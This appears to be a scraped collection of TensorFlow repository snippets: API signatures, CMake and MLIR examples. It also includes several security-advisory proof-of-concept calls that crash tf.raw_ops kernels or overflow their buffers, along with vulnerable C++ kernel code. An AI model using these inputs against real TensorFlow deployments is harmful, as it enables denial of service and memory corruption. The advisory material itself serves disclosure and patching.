DESCRIPTION: This Python snippet shows another way to trigger the denial of service vulnerability in TensorFlow's `tf.strings.substr`. Using an out-of-bounds index (2) for the `pos` argument, given the input string length ('abc') and a length of 1, results in a `CHECK`-fail and a crash. This code depends on the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-106.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.strings.substr(input='abc', len=1, pos=[1,2])
```

----------------------------------------

TITLE: Comparing Embedding Objects - TFLite Support Python
DESCRIPTION: Provides the signature for the `__eq__` method of the `Embedding` class. This method is used to compare an `Embedding` object with `other` (of type `Any`) for equality and returns a boolean result.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Embedding.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Triggering UnbatchGradOp CHECK failure with incorrect batch_index size (Python)
DESCRIPTION: This Python snippet illustrates another way to trigger a CHECK failure in `tf.raw_ops.UnbatchGrad` by providing a `batch_index` tensor whose total number of elements is not three times the size of its first dimension. The operation expects this specific size relationship.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-092.md#_snippet_1

LANGUAGE: python
CODE:
```
import numpy as np
import tensorflow as tf

# batch_index's size is not 3
tf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,], dtype=tf.int64))
```

----------------------------------------

TITLE: Retrieving Tensor Dimension Data - TFLite C++
DESCRIPTION: This inline helper function, `SizeOfDimension`, is used in TFLite kernels to retrieve the size of a specified dimension (`dim`) from a `TfLiteTensor`. It directly accesses the `t->dims->data` array at the given index. The vulnerability lies in the lack of bounds checking for `dim`, allowing an out-of-bounds read if `dim` is invalid (not between 0 and the number of dimensions).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-094.md#_snippet_1

LANGUAGE: C++
CODE:
```
inline int SizeOfDimension(const TfLiteTensor* t, int dim) {
  return t->dims->data[dim];
}
```

----------------------------------------

TITLE: Getting DataLoader Size (Python)
DESCRIPTION: Returns the total number of elements in the dataset managed by the data loader. This relies on the `size` attribute being correctly provided or calculated upon initialization, as the underlying `tf.data.Dataset` object may not intrinsically provide a length.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/DataLoader.md#_snippet_4

LANGUAGE: Python
CODE:
```
__len__()

```

----------------------------------------

TITLE: Checking Equality of Classifications Objects - Python
DESCRIPTION: Checks if the current `Classifications` object is equal to another object. This is typically used for comparing two classification result instances.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Classifications.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Including 'c' Subdirectory in CMake
DESCRIPTION: Adds the 'c' subdirectory to the CMake build configuration. This command processes the CMakeLists.txt file located within the 'c' directory, incorporating its build targets and settings into the overall project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/bindings/CMakeLists.txt#_snippet_0

LANGUAGE: cmake
CODE:
```
add_subdirectory(c)
```

----------------------------------------

TITLE: Conditionally Linking TensorFlow Lite Libraries (CMake)
DESCRIPTION: This block conditionally links the necessary TensorFlow Lite libraries to the `minimal` executable based on the `LINK_TFLITE_FLEX` option. If enabled, it attempts to find and link the `tensorflowlite_flex` library; otherwise, it only links the core `tensorflow-lite` library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
if(LINK_TFLITE_FLEX)
  find_library(TF_LIB_FLEX tensorflowlite_flex HINTS "${TENSORFLOW_SOURCE_DIR}/bazel-bin/tensorflow/lite/delegates/flex/")
  if(NOT TF_LIB_FLEX)
    message(FATAL_ERROR "tensorflowlite_flex library not found")
  endif()

  target_link_libraries(minimal
    tensorflow-lite
    -Wl,--no-as-needed # Add --no-as-needed since for some toolchains (e.g. Ubuntu) --as-needed is added by default.
    ${TF_LIB_FLEX}
  )
else()
  target_link_libraries(minimal
    tensorflow-lite
  )
endif()
```

----------------------------------------

TITLE: Initialize TFLite Interpreter with CoreML Delegate (C API <= 2.3.0)
DESCRIPTION: Demonstrates the process of initializing a TensorFlow Lite Interpreter using the C API with the Core ML delegate as it was done up to version 2.3.0, covering model loading, delegate creation with default options, adding the delegate, interpreter creation, tensor allocation, and necessary resource disposal.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/coreml_delegate.md#_snippet_3

LANGUAGE: C
CODE:
```
#include "tensorflow/lite/delegates/coreml/coreml_delegate.h"

    // Initialize interpreter with model
    TfLiteModel* model = TfLiteModelCreateFromFile(model_path);

    // Initialize interpreter with Core ML delegate
    TfLiteInterpreterOptions* options = TfLiteInterpreterOptionsCreate();
    TfLiteDelegate* delegate = TfLiteCoreMlDelegateCreate(NULL);  // default config
    TfLiteInterpreterOptionsAddDelegate(options, delegate);
    TfLiteInterpreterOptionsDelete(options);

    TfLiteInterpreter* interpreter = TfLiteInterpreterCreate(model, options);

    TfLiteInterpreterAllocateTensors(interpreter);

    // Run inference ...

    /* ... */

    // Dispose resources when it is no longer used.
    // Add following code to the section where you dispose of the delegate
    // (e.g. `dealloc` of class).

    TfLiteInterpreterDelete(interpreter);
    TfLiteCoreMlDelegateDelete(delegate);
    TfLiteModelDelete(model);
```

----------------------------------------

TITLE: MLIR stablehlo.custom_call with Struct-like Attribute
DESCRIPTION: An example `stablehlo.custom_call` operation in MLIR where a dictionary attribute (`range`) is used to represent a C++ struct. This nested attribute can be automatically decoded into a user-defined C++ struct.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_12

LANGUAGE: MLIR
CODE:
```
%0 = "stablehlo.custom_call"(%arg0) {
  call_target_name = "foo",
  backend_config= {
    range = { lo = 0 : i64, hi = 42 : i64 }
  },
  api_version = 4 : i32
} : (tensor<f32>) -> tensor<f32>
```

----------------------------------------

TITLE: Adding Output Tensor Metadata Index in TFLite Support (Python)
DESCRIPTION: This function is used during the FlatBuffers building process for TFLite model metadata. It adds the index (offset) of a previously built output tensor metadata object to the current `SubGraphMetadata` being constructed. It requires the FlatBuffers builder instance and the index of the output tensor metadata object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataAddOutputTensorMetadata.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataAddOutputTensorMetadata(
    builder, outputTensorMetadata
)
```

----------------------------------------

TITLE: Pruning Unreachable Ops in TF Executor Graph (After)
DESCRIPTION: This MLIR snippet shows the `tf_executor.graph` after applying the `-tf-executor-graph-pruning` pass to the previous example. The `%unreachable_data` and `%unreachable_control` islands, which were not transitively connected to the `tf_executor.fetch` operation via data or control dependencies, have been successfully removed, optimizing the graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_12

LANGUAGE: MLIR
CODE:
```
func @graph(%arg0: tensor<i32>, %arg1: tensor<i32>) -> tensor<i32> {
  %graph = tf_executor.graph {
    %transitive_reachable_data:2 = tf_executor.island wraps "tf.Identity"(%arg0) : (tensor<i32>) -> tensor<i32>
    %reachable_data:2 = tf_executor.island wraps "tf.Identity"(%transitive_reachable_data#0) : (tensor<i32>) -> tensor<i32>
    %transitive_reachable_control = tf_executor.island wraps "tf.NoOp"() : () -> ()
    %reachable_control = tf_executor.island(%transitive_reachable_control) wraps "tf.NoOp"() : () -> ()
    tf_executor.fetch %reachable_data#0, %reachable_control : tensor<i32>, tensor<i32>
  }
  return %graph : tensor<i32>
}
```

----------------------------------------

TITLE: Comparing ModelHParams Equality - Python
DESCRIPTION: Checks if this `ModelHParams` instance is equal to another object. This method is typically generated automatically by attribute libraries like `attrs` for comparing parameter sets based on their attribute values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/spec/ModelHParams.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Demonstrating FusedBatchNorm Undefined Behavior in TensorFlow (Python)
DESCRIPTION: This Python snippet illustrates how providing empty tensors for scale, offset, mean, and variance to `tf.raw_ops.FusedBatchNorm` can trigger undefined behavior. The lack of proper shape validation for these empty tensors results in the dereferencing of null pointers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-072.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

x = tf.zeros([10, 10, 10, 1], dtype=tf.float32)
scale = tf.constant([], shape=[0], dtype=tf.float32)
offset = tf.constant([], shape=[0], dtype=tf.float32)
mean = tf.constant([], shape=[0], dtype=tf.float32)
variance = tf.constant([], shape=[0], dtype=tf.float32)
epsilon = 0.0
exponential_avg_factor = 0.0
data_format = "NHWC"
is_training = False

tf.raw_ops.FusedBatchNorm(
  x=x, scale=scale, offset=offset, mean=mean, variance=variance,
  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,
  data_format=data_format, is_training=is_training)
```

----------------------------------------

TITLE: Creating Public TableGen Target (CMake)
DESCRIPTION: Defines a public CMake build target (`StablehloExtensionPassesIncGen`) that represents the result of a TableGen generation step. This target can be added as a dependency to other targets that require the generated files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/stablehlo_ext/transforms/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_public_tablegen_target(StablehloExtensionPassesIncGen)
```

----------------------------------------

TITLE: Triggering Heap Buffer Overflow in Conv3DBackpropFilterV2 - Python
DESCRIPTION: This Python snippet demonstrates how to trigger a heap buffer overflow in `tf.raw_ops.Conv3DBackpropFilterV2`. It provides crafted `input`, `filter_sizes`, and `out_backprop` tensors along with specific `strides` that exploit the lack of validation between these arguments, potentially leading to memory corruption. The large input tensor size combined with specific stride values is key. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-010.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_values = [-10.0] * (7 * 7 * 7 * 7 * 7)
input_values[0] = 429.6491056791816
input_sizes = tf.constant(input_values, shape=[7, 7, 7, 7, 7], dtype=tf.float32)
filter_tensor = tf.constant([7, 7, 7, 1, 1], shape=[5], dtype=tf.int32)
out_backprop = tf.constant([-10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[7, 1, 1, 1, 1], dtype=tf.float32)

tf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 37, 65, 93, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

----------------------------------------

TITLE: Vulnerable RequantizationRange Kernel Access - C++
DESCRIPTION: These lines from the C++ implementation of the `RequantizationRange` kernel show the vulnerable code. They attempt to access the first element (index 0) of the `input_min` and `input_max` tensors using `.flat<float>()(0)` without checking if the tensors are empty, resulting in an out-of-bounds read.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-058.md#_snippet_1

LANGUAGE: cpp
CODE:
```
const float input_min_float = ctx->input(1).flat<float>()(0);
const float input_max_float = ctx->input(2).flat<float>()(0);
```

----------------------------------------

TITLE: Including Build Directories (CMake)
DESCRIPTION: Adds the current binary and source directories to the list of include directories used by the compiler. The BEFORE keyword ensures these directories are searched before standard include paths.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
include_directories(BEFORE
    ${CMAKE_CURRENT_BINARY_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR})
```

----------------------------------------

TITLE: Conditional Linking Options for Shared Libraries - CMake
DESCRIPTION: Applies platform-specific linker options if building a shared library. For Windows, it adds a compile definition `TFL_COMPILE_LIBRARY`. For Apple, it uses `-exported_symbols_list`. For other platforms, it uses `--version-script`. These options control symbol visibility in the shared library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/CMakeLists.txt#_snippet_9

LANGUAGE: CMake
CODE:
```
if (TFLITE_C_BUILD_SHARED_LIBS)
  if (WIN32)
    target_compile_definitions(tensorflowlite_c PRIVATE TFL_COMPILE_LIBRARY)
    target_compile_definitions(tensorflow-lite PRIVATE TFL_COMPILE_LIBRARY)
  elseif (APPLE)
    target_link_options(tensorflowlite_c PRIVATE "-Wl,-exported_symbols_list,${TFLITE_SOURCE_DIR}/c/exported_symbols.lds")
  else ()
    target_link_options(tensorflowlite_c PRIVATE "-Wl,--version-script,${TFLITE_SOURCE_DIR}/c/version_script.lds")
  endif()
endif()
```

----------------------------------------

TITLE: Demonstrating CudnnRNNV3 Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the heap buffer overflow vulnerability in `tf.raw_ops.CudnnRNNV3` by providing inputs (`input`, `input_h`, `input_c`) with incorrect ranks. The `tf.function` decorator wraps the call to the vulnerable operation, illustrating the context in which the issue can occur.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-174.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def func():
  return tf.raw_ops.CudnnRNNV3(
    input=[0.1, 0.1],
    input_h=[0.5],
    input_c=[0.1, 0.1, 0.1],
    params=[0.5, 0.5],
    sequence_lengths=[-1, 0, 1])

func()
```

----------------------------------------

TITLE: Checking Equality for TFLite ClassificationOptions Python
DESCRIPTION: Checks if the current `ClassificationOptions` object is equal to another object. Equality is determined by comparing the values of all relevant attributes of the two objects. It takes an arbitrary object as input and returns a boolean indicating whether they are considered equal.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/ClassificationOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other: Any
) -> bool

```

----------------------------------------

TITLE: Binding XLA FFI Handler with Struct Attribute Decoding
DESCRIPTION: Shows how to define a C++ struct (`Range`), register it for XLA FFI attribute decoding using `XLA_FFI_REGISTER_STRUCT_ATTR_DECODING`, and bind a handler that automatically decodes a dictionary MLIR attribute into this struct type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_13

LANGUAGE: C++
CODE:
```
struct Range {
  int64_t lo;
  int64_t hi;
};

XLA_FFI_REGISTER_STRUCT_ATTR_DECODING(Range, StructMember<int64_t>("lo"),
                                             StructMember<int64_t>("hi"));

auto handler = Ffi::Bind().Attr<Range>("range").To([](Range range) -> Error{
  return Error::Success();
});
```

----------------------------------------

TITLE: Adding MhloRegisterDialects Library
DESCRIPTION: This command defines the `MhloRegisterDialects` library target from `init.cc` and specifies its dependency on the HLO operations TableGen target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/IR/CMakeLists.txt#_snippet_9

LANGUAGE: cmake
CODE:
```
add_mlir_dialect_library(MhloRegisterDialects
  init.cc
DEPENDS
  MLIRhlo_opsIncGen
)
```

----------------------------------------

TITLE: Set CMake Policy CMP0075
DESCRIPTION: Sets CMake policy CMP0075 to NEW, which affects how target property linking is handled. This policy ensures more consistent linking behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
if(POLICY CMP0075)
  cmake_policy(SET CMP0075 NEW)
endif()
```

----------------------------------------

TITLE: Lowering tf.Sub to TOSA MLIR
DESCRIPTION: Documents the trivial lowering of the TensorFlow `tf.Sub` operation, which computes element-wise subtraction, directly to the TOSA dialect's `tosa.SUB` operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_42

LANGUAGE: MLIR
CODE:
```
This operator is trivially lowered to tosa.SUB.
```

LANGUAGE: MLIR
CODE:
```
tosa.SUB
```

----------------------------------------

TITLE: Triggering TensorFlow MatrixSetDiagV3 Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the CVE-2021-37658 vulnerability in TensorFlow. Calling `tf.raw_ops.MatrixSetDiagV3` with an empty list `[]` for the `k` parameter exploits the incomplete validation, leading to undefined behavior or a crash in affected versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-132.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.MatrixSetDiagV3(
  input=[1,2,3],
  diagonal=[1,1],
  k=[],
  align='RIGHT_LEFT')
```

----------------------------------------

TITLE: Vulnerable Shape Inference Logic for TensorFlow Transpose C++
DESCRIPTION: This C++ snippet shows the problematic shape inference logic for the `Transpose` operation before the patch. It iterates through the `perm` indices (`data[i]`) but only checks if they are greater than or equal to the rank. It fails to validate negative indices or other invalid values, allowing out-of-bounds access when `c->Dim` is called with an invalid `in_idx`, leading to the heap buffer overflow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-179.md#_snippet_1

LANGUAGE: cpp
CODE:
```
for (int32_t i = 0; i < rank; ++i) {
  int64_t in_idx = data[i];
  if (in_idx >= rank) {
    return errors::InvalidArgument("perm dim ", in_idx,
                                   " is out of range of input rank ", rank);
  }
  dims[i] = c->Dim(input, in_idx);
}
```

----------------------------------------

TITLE: Vulnerable Output Dimension Calculation C++ TFLite
DESCRIPTION: This C++ snippet from the TFLite `arg_min_max.cc` kernel shows the vulnerable code for calculating output tensor dimensions. If `axis_value` is outside the valid range [0, NumDimensions(input)-1], the index `j` is not incremented correctly within the loop, leading to writes past the allocated buffer for `output_dims->data`, causing a heap out-of-bounds write.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-093.md#_snippet_0

LANGUAGE: C++
CODE:
```
TfLiteIntArray* output_dims = TfLiteIntArrayCreate(NumDimensions(input) - 1);
int j = 0;
for (int i = 0; i < NumDimensions(input); ++i) {
  if (i != axis_value) {
    output_dims->data[j] = SizeOfDimension(input, i);
    ++j;
  }
}
```

----------------------------------------

TITLE: Initializing AudioPropertiesT From Packed Buffer - Python
DESCRIPTION: This class method initializes an `AudioPropertiesT` object from a packed buffer (`buf`), optionally starting at a specified position (`pos`, default is 0). It's used for deserializing data from a packed buffer format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioPropertiesT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)

```

----------------------------------------

TITLE: Find ZLIB Dependency
DESCRIPTION: Includes the standard FindZLIB module to locate the ZLIB compression library if the LLVM_ENABLE_ZLIB option is enabled. This makes ZLIB available for linking if needed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_10

LANGUAGE: CMake
CODE:
```
if(LLVM_ENABLE_ZLIB)
  find_package(ZLIB)
endif()
```

----------------------------------------

TITLE: Initialize Frontend Configuration C++
DESCRIPTION: This C++ function initializes a `FrontendConfig` structure with the library's default parameters for the audio processing pipeline. It's a necessary step before using the configuration to populate the frontend state for processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/microfrontend/lib/README.md#_snippet_0

LANGUAGE: C++
CODE:
```
void FrontendFillConfigWithDefaults(struct FrontendConfig* config)
```

----------------------------------------

TITLE: Compare DetectionOptions Object Equality Python
DESCRIPTION: Compares the current `DetectionOptions` object with another object (`other`) to check if they are equal. This method returns `True` if all attributes of the two objects match, and `False` otherwise.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/DetectionOptions.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Starting ImageSize in TFLite Metadata Schema Python
DESCRIPTION: This Python function is used to initiate the creation of an `ImageSize` flatbuffer structure using a provided flatbuffer `builder`. It prepares the builder to subsequently add fields specific to the `ImageSize` schema element. It requires a valid FlatBuffers builder instance as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSizeStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ImageSizeStart(
    builder
)
```

----------------------------------------

TITLE: Configuring CMake for ARMv6 TFLite (sh)
DESCRIPTION: This script block sets environment variables for the ARMv6 cross-compiler prefix and specific compilation flags for ARMv6 (e.g., -march=armv6 -mfpu=vfp), then invokes CMake to configure the TensorFlow Lite build system for ARMv6, explicitly disabling XNNPACK due to lack of NEON support.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_arm.md#_snippet_7

LANGUAGE: sh
CODE:
```
ARMCC_FLAGS="-march=armv6 -mfpu=vfp -mfloat-abi=hard -funsafe-math-optimizations"
ARMCC_PREFIX=${HOME}/toolchains/gcc-arm-8.3-2019.03-x86_64-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-
cmake -DCMAKE_C_COMPILER=${ARMCC_PREFIX}gcc \
  -DCMAKE_CXX_COMPILER=${ARMCC_PREFIX}g++ \
  -DCMAKE_C_FLAGS="${ARMCC_FLAGS}" \
  -DCMAKE_CXX_FLAGS="${ARMCC_FLAGS}" \
  -DCMAKE_VERBOSE_MAKEFILE:BOOL=ON \
  -DCMAKE_SYSTEM_NAME=Linux \
  -DCMAKE_SYSTEM_PROCESSOR=armv6 \
  -DTFLITE_ENABLE_XNNPACK=OFF \
  ../tensorflow/lite/
```

----------------------------------------

TITLE: Calling standard Python list.pop Python
DESCRIPTION: This snippet demonstrates the standard Python way to remove and return the last element from a list `l`. The `list.pop()` method modifies the list in place and returns the removed item. This is the standard behavior that the AutoGraph `list_pop` function aims to emulate or dispatch to.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/operators.md#_snippet_7

LANGUAGE: python
CODE:
```
x = l.pop()
```

----------------------------------------

TITLE: Demonstrating TensorFlow Segment Op Crash (Python)
DESCRIPTION: This Python snippet demonstrates the TFSA-2021-200 vulnerability by calling various `tf.math.segment_*` operations with a large segment ID. This specific input is designed to trigger the integer overflow in the shape calculation, leading to a crash (CHECK-fail) in vulnerable versions of TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-200.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.math.segment_max(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])
tf.math.segment_min(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])
tf.math.segment_mean(data=np.ones((1,10,1)), segment_ids=[167624052429249355])
tf.math.segment_sum(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])
tf.math.segment_prod(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])
```

----------------------------------------

TITLE: Demonstrating Depthwise Op Overflow Vulnerability TensorFlow Python
DESCRIPTION: This Python snippet demonstrates a denial of service vulnerability (CVE-2021-41197) in TensorFlow's tf.raw_ops.DepthwiseConv2dNativeBackpropFilter. It constructs input tensors, including a filter_sizes tensor with a value (1879048192) specifically chosen to cause an integer overflow when calculating tensor sizes, leading to a CHECK failure and program termination in vulnerable TensorFlow versions. The snippet shows how malicious input can trigger the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-071.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
filter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)
out_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
tf.raw_ops.DepthwiseConv2dNativeBackpropFilter(
    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding="SAME")
```

----------------------------------------

TITLE: Building MLIR MhloToLinalg Library (CMake)
DESCRIPTION: Defines a CMake target for the MhloToLinalg library. This library contains MLIR passes and patterns for legalizing MHLO dialect operations to the Linalg dialect, listing the source file and dependencies on Linalg utilities and transformations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_11

LANGUAGE: CMake
CODE:
```
add_mlir_library(MhloToLinalg
  legalize_to_linalg/legalize_to_linalg.cc

  DEPENDS
  MLIRhlo_opsIncGen
  MLIRMhloPassIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  HloToLinalgUtils
  MhloDialect
  MhloRngUtils
  MhloToArithmeticConversion
  MhloTypeConversion
  MLIRBufferizationDialect
  MLIRComplexDialect
  MLIRIR
  MLIRLinalgTransforms
  MLIRLinalgUtils
  MLIRPass
  MLIRRewrite
  MLIRTransformUtils
)
```

----------------------------------------

TITLE: Initializing CUDA Redistributions with Path Prefix (Bazel)
DESCRIPTION: This Bazel snippet demonstrates how to initialize CUDA redistribution repositories when using JSON files or dictionaries that contain `relative_path` entries. The `cuda_redist_path_prefix` attribute specifies the base URL or directory path that will be prepended to all relative paths.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_9

LANGUAGE: Bazel
CODE:
```
cuda_redist_init_repositories(
   cuda_redistributions = CUDA_REDISTRIBUTIONS,
   cuda_redist_path_prefix = "file:///usr/Downloads/dists/",
)
```

----------------------------------------

TITLE: Triggering AudioSummaryV2 Vulnerability in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the denial-of-service vulnerability in TensorFlow's `AudioSummaryV2`. It shows how providing a `sample_rate` tensor with a shape of `(2,1)` (more than one element) to the `tf.raw_ops.AudioSummaryV2` call causes a `CHECK` failure. The vulnerability allows an attacker to crash the process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-125.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
arg_0=''
arg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_2=tf.random.uniform(shape=(2,1), dtype=tf.float32, maxval=None)
arg_3=3
arg_4=''
tf.raw_ops.AudioSummaryV2(tag=arg_0, tensor=arg_1, sample_rate=arg_2,
                          max_outputs=arg_3, name=arg_4)
```

----------------------------------------

TITLE: Checking Equality of EmbeddingOptions in Python
DESCRIPTION: Implements the equality check (`==`) for `EmbeddingOptions` objects. Compares the current object with another (`other`) to determine if they represent the same configuration. Returns `True` if the objects are considered equal, `False` otherwise. Dependencies: `typing.Any` for type hinting.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/EmbeddingOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(\n    other: Any\n) -> bool
```

----------------------------------------

TITLE: Initializing AudioProperties Object in Python
DESCRIPTION: Initializes the `AudioProperties` object with a specific buffer and position. This method is part of the FlatBuffers object lifecycle, typically used internally after a buffer has been parsed by a `GetRootAs` method. It requires the buffer object and the position within the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioProperties.md#_snippet_4

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Checking Equality of TFLite SegmentationOptions (Python)
DESCRIPTION: This snippet provides the signature for the `__eq__` method of the `SegmentationOptions` class. This method is used to compare two `SegmentationOptions` objects for equality based on their attribute values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/SegmentationOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other: Any
) -> bool

```

----------------------------------------

TITLE: Adding XNNPACK Subdirectory in CMake
DESCRIPTION: This command adds the XNNPACK source directory to the current CMake project as a subdirectory. It specifies both the source directory (presumably provided by the `xnnpack_SOURCE_DIR` variable) and the corresponding binary output directory (`xnnpack_BINARY_DIR`). This integrates the XNNPACK build into the main project's build process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/xnnpack/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
add_subdirectory(
  "${xnnpack_SOURCE_DIR}"
  "${xnnpack_BINARY_DIR}"
)
```

----------------------------------------

TITLE: Removing -mcpu Flag in CMake
DESCRIPTION: This code snippet iterates through common CMake compiler and compiler argument variables for Assembly, C, and C++. For each variable that is set, it uses a regular expression to replace and remove any occurrence of the `-mcpu=` switch followed by its argument. This is necessary to avoid compilation issues with the XNNPACK library, which is incompatible with this flag.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/xnnpack/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
